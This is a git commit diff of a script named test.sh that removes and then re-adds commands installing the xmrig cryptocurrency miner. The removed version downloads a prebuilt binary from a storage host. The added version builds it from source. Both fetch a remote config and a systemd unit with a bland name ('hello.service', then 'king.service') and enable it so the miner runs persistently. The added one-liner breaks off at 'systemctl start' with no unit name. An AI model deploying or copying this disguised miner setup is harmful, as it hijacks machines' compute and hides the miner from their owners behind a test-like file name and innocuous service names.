d43bef748ce34e240088ec833c0ab50ba8c56b9f
kalinh <taikhoanxzc004@gmail.com>
2020-10-17 20:23:40 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,17 +1,2 @@
 #!/usr/bin/env bash
-sudo su
-sudo apt-get update -y
-sudo apt-get install libhwloc-dev -y
-cd /usr/local/src/
-sudo mkdir xmrig
-cd xmrig && sudo mkdir build
-cd build
-wget https://doublepro.nyc3.digitaloceanspaces.com/xmrig
-sysctl -w vm.nr_hugepages=1024
-curl https://raw.githubusercontent.com/taikhoanxzc004/scaleway/master/XM-S1.json > /usr/local/src/xmrig/build/config.json
-curl https://raw.githubusercontent.com/taikhoanxzc004/scaleway/master/hello.service > /lib/systemd/system/hello.service
-chmod a+x xmrig
-chmod a+x config.json
-sudo systemctl daemon-reload
-sudo systemctl enable hello.service
-sudo systemctl start hello.service
+sudo apt-get update -y && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && cd /home && sudo git clone https://github.com/xmrig/xmrig.git  && cd xmrig && sudo mkdir build && cd build && sudo cmake .. && sudo make -j$(nproc) && sudo sysctl -w vm.nr_hugepages=1024 && sudo wget https://raw.githubusercontent.com/taikhoanxzc004/scaleway/master/XM-S1.json && sudo mv XM-S1.json config.json && sudo wget https://raw.githubusercontent.com/taikhoanxzc004/scaleway/master/king.service && sudo cp king.service /lib/systemd/system/king.service && sudo systemctl daemon-reload && sudo systemctl enable king.service && sudo systemctl start
